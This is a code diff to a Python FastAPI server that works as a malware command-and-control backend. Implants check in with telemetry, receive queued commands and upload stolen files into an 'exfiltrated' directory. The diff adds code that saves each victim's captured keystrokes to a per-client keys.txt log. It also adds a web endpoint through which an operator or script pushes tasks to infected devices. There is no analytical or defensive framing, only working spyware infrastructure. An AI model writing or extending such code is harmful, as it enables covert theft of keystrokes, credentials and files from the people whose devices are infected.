@@ -3,6 +3,7 @@ from fastapi import FastAPI, Request, File, UploadFile
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import FileResponse
 from contextlib import asynccontextmanager
+from datetime import datetime
 from db import init_db, register_client, get_pending_task, complete_task
 import uvicorn
 import json
@@ -49,6 +50,19 @@ async def checkin(client_id: str, platform: str, request: Request):
             hostname = telemetry.get('hostname', 'Unknown')
             os_version = telemetry.get('os_version', 'Unknown')
             
+            # --- INTEGRATED: KEYLOG EXTRACTION (APPEND MODE) ---
+            keylogs = telemetry.get('keylogs')
+            if keylogs:
+                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                print(f"\n⌨️ [KEYLOGS] FROM {client_id} at {now}: {keylogs}")
+                
+                log_dir = os.path.join("exfiltrated", client_id)
+                os.makedirs(log_dir, exist_ok=True)
+                
+                # Using "a" for append and adding a timestamp separator
+                with open(os.path.join(log_dir, "keys.txt"), "a", encoding="utf-8") as f:
+                    f.write(f"\n--- {now} ---\n{keylogs}\n")
+            
             # Platform-specific logging logic
             if platform == "android":
                 net = telemetry.get('network', 'N/A')
@@ -82,6 +96,12 @@ async def checkin(client_id: str, platform: str, request: Request):
         "command": command_payload
     }
 
+@app.post("/commander/push")
+async def commander_push(client_id: str, action: str, payload: dict = {}):
+    # This endpoint allows the commander or external scripts to queue tasks via Web
+    await add_task(client_id, action, payload)
+    return {"status": "success", "action": action, "client_id": client_id}
+
 @app.post("/report/{client_id}")
 async def report_output(client_id: str, request: Request):
     data = await request.json()
@@ -102,16 +122,6 @@ async def report_output(client_id: str, request: Request):
         print("-" * 40 + "\n")
     
     return {"status": "received"}
-
-if __name__ == "__main__":
-    uvicorn.run(
-        "main:app",
-        host="0.0.0.0", 
-        port=8443, 
-        ssl_keyfile="key.pem", 
-        ssl_certfile="cert.pem",
-        reload=True
-    )
 
 # Ensure a directory exists for exfiltrated files
 UPLOAD_DIR = "exfiltrated"
@@ -137,3 +147,13 @@ async def upload_file(client_id: str, file: UploadFile = File(...)):
     
     print(f"[+] EXFILTRATION: {file.filename} received from {client_id}")
     return {"status": "success", "path": file_path}
+
+if __name__ == "__main__":
+    uvicorn.run(
+        "main:app",
+        host="0.0.0.0", 
+        port=8443, 
+        ssl_keyfile="key.pem", 
+        ssl_certfile="cert.pem",
+        reload=True
+    )
